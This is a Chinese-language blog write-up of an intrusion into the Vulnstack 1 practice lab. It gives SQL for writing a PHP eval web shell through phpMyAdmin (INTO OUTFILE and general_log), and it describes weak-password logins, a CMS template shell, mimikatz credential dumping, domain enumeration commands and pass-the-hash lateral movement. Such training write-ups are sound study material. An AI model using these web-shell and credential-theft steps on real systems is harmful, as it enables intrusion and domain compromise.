@@ -1,0 +1,779 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ZERO">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言靶场下载链接：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;1vxyz&#x2F;p&#x2F;17201316.html https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_46022776&#x2F;article&#x2F;details&#x2F;139295589 拓扑图：  环境配置目标IP：192.168.170">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场vulnstack1实战笔记">
+<meta property="og:url" content="http://example.com/2024/08/03/domain2/index.html">
+<meta property="og:site_name" content="ZERO&#39;s Blog">
+<meta property="og:description" content="前言靶场下载链接：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;1vxyz&#x2F;p&#x2F;17201316.html https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_46022776&#x2F;article&#x2F;details&#x2F;139295589 拓扑图：  环境配置目标IP：192.168.170">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/11.jpg">
+<meta property="article:published_time" content="2024-08-03T05:18:45.000Z">
+<meta property="article:modified_time" content="2025-01-22T10:09:54.089Z">
+<meta property="article:author" content="ZERO">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/11.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>红日靶场vulnstack1实战笔记 - ZERO&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-C16YBJWRLK"},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-C16YBJWRLK", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-C16YBJWRLK');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ZERO&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/11.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="红日靶场vulnstack1实战笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-03 13:18" pubdate>
+          2024年8月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">红日靶场vulnstack1实战笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>靶场下载链接：</strong><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p><strong>参考链接：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17201316.html">https://www.cnblogs.com/1vxyz/p/17201316.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46022776/article/details/139295589">https://blog.csdn.net/weixin_46022776/article/details/139295589</a></p>
+<p><strong>拓扑图：</strong></p>
+<p><img src="/img/domain2_1.png" srcset="/img/loading.gif" lazyload alt="domain2_1"></p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>目标IP：</strong>192.168.170.139</p>
+<p><strong>DMZ-Windows7：</strong></p>
+<p>网卡1（NAT，相当于外网）：192.168.170.139</p>
+<p>网卡2（仅主机，相当于内网）：192.168.52.143</p>
+<p><strong>DC-WindowsServer2008：</strong></p>
+<p>网卡（仅主机，相当于内网）：192.168.52.138</p>
+<p><strong>域成员-Windows2K3：</strong></p>
+<p>网卡（仅主机，相当于内网）：192.168.52.141</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>按照宇宙惯例对目标IP进行扫描，发现其80、3306等端口均开放</p>
+<p><img src="/img/domain2_1.png" srcset="/img/loading.gif" lazyload alt="domain2_2"></p>
+<p>使用dirsearch对目标目录进行爆破，发现存在<code>/phpmyAdmin</code></p>
+<p><img src="/img/domain2_1.png" srcset="/img/loading.gif" lazyload alt="domain2_3"></p>
+<p>尝试使用弱口令<code>root/root</code>直接登入</p>
+<h2 id="phpmyadmin后台getshell"><a href="#phpmyadmin后台getshell" class="headerlink" title="phpmyadmin后台getshell"></a>phpmyadmin后台getshell</h2><p>phpmyadmin存在以下两种getshell的方式：</p>
+<ul>
+<li>into outfile导入木马</li>
+<li>利用MySQL日志文件getshell</li>
+</ul>
+<h3 id="尝试into-outfile导入木马"><a href="#尝试into-outfile导入木马" class="headerlink" title="尝试into outfile导入木马"></a>尝试into outfile导入木马</h3><p>执行 <code>select @@basedir;</code> 查看一下网站的路径</p>
+<p><img src="/img/domain2_4.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>可知路径为<code>C:/phpstudy/MySQL</code></p>
+<p>再尝试执行<code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;C:/phpStudy/www/hack.php&#39;;</code></p>
+<p>尝试将木马写入到www网站的根目录下，但失败了</p>
+<p>原因是MySQL的新特性<code>secure_file_priv</code>会对读写文件产生影响，该参数用来限制导入导出，可以借助<code>show global variables like &#39;%secure%&#39;;</code>命令来查看该参数</p>
+<p><img src="/img/domain2_5.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p><strong>可见此处<code>secure_file_priv</code>的值为<code>NULL</code>，当<code>secure_file_priv</code>的值为<code>NULL</code>时，表示限制MySQL不允许导入导出，所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv &#x3D;””</strong></p>
+<h3 id="利用Mysql日志文件写入shell"><a href="#利用Mysql日志文件写入shell" class="headerlink" title="利用Mysql日志文件写入shell"></a>利用Mysql日志文件写入shell</h3><p>先执行命令：<code>show variables like &#39;%general%&#39;;</code> 查看日志状态：</p>
+<p><img src="/img/domain2_6.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>当开启 <code>general_log</code> 时，所执行的 SQL 语句都会出现在 stu1.log 文件中，如果修改 <code>general_log_file</code> 的值为一个php文件，则所执行的 SQL 语句就会对应生成在对应的文件中，进而可 Getshell</p>
+<p>开启 general_log：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>指定日志写入到网站根目录的 hack.php 文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpStudy/www/hack.php&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后执行SQL语句，<code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>，可将此一句话木马写入<code>hack.php</code></p>
+<p>访问<code>/hack.php</code>可发现已成功写入</p>
+<h2 id="yxcms后台getshell"><a href="#yxcms后台getshell" class="headerlink" title="yxcms后台getshell"></a>yxcms后台getshell</h2><p>参考其他师傅的wp，其实在目标IP的<code>/yxcms</code>路径下可发现还存在有一个cms系统，前台公告处发现存在泄露后台地址以及默认的管理员用户名和密码，尝试登录成功，在后台的模板处对前台模板进行编辑，写入木马然后进行保存</p>
+<p><img src="/img/domain2_7.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>此外，通过泄露的cms备份文件<code>beifen.rar</code>可知前台模板的php文件保存路径为：<code>/yxcms/protected/apps/default/view/default/</code>通过此路径，我们也可以成功连接上shell</p>
+<h2 id="内网信息探测搜集"><a href="#内网信息探测搜集" class="headerlink" title="内网信息探测搜集"></a>内网信息探测搜集</h2><p>用蚁剑连接shell，查看开放的端口，发现<code>3389</code>并未开放，输入命令打开<code>3389</code>端口，并创建新用户<code>test1024</code>成功登录远程桌面</p>
+<p>发现是<code>Windows7</code>系统，且存在域<code>god.org</code></p>
+<p><img src="/img/domain2_8.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>由于个人使用习惯，使用<code>CobaltStrike</code>生成木马并在该机器执行，成功上线CS</p>
+<p>然后在CS使用<code>mimkatz</code>成功得到<code>administrator</code>用户的密码</p>
+<p><img src="/img/domain2_9.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>内网信息收集的主要目的就是查找域控以及域内的其他主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">net view                 # 查看局域网内其他主机名<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）<br></code></pre></td></tr></table></figure>
+
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>利用拿下的机器进行内网扫描，可以发现另外两台内网的机器，由于之前已经利用<code>mimkatz</code>窃取到了用户的哈希凭证，这里可以直接利用票据传递攻击来进行横向移动</p>
+<p>使用SMB方式建立监听（注意！Guardrails可不设置任何内容）右键进行票据传递攻击</p>
+<p><img src="/img/domain2_10.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+<p>成功拿下域控以及另一台域内主机</p>
+<p><img src="/img/domain2_11.png" srcset="/img/loading.gif" lazyload alt="domain2_4"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="print-no-link">#信息收集</a>
+      
+        <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="print-no-link">#横向移动</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>红日靶场vulnstack1实战笔记</div>
+      <div>http://example.com/2024/08/03/domain2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ZERO</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/22/NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/" title="NTLM中继攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NTLM中继攻击</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/11/domain1/" title="红日靶场vulnstack7实战笔记">
+                        <span class="hidden-mobile">红日靶场vulnstack7实战笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
